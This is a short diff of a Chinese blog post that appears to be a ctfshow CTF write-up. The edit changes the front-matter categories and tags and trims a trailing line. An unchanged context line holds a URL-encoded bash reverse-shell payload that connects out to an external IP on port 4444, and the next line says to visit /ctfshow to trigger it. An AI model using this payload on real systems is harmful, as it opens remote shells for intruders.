@@ -6,8 +6,8 @@ date: "2025-01-10T16:33:17"
 lastmod: "2025-01-10T16:33:17"
 image: ""
 license: ""
-categories: ["ctfshow"]
-tags: ["php", "Tomcat"]
+categories: ["赛题"]
+tags: ["ctfshow", "Tomcat"]
 ---
 ## web签到
 
@@ -364,4 +364,3 @@ username=1.sh&password=bash -i %3E%26 /dev/tcp/156.238.233.9/4444 0%3E%261
 然后访问`/ctfshow`进行触发
 
 ![image](./assets/009.png)
-
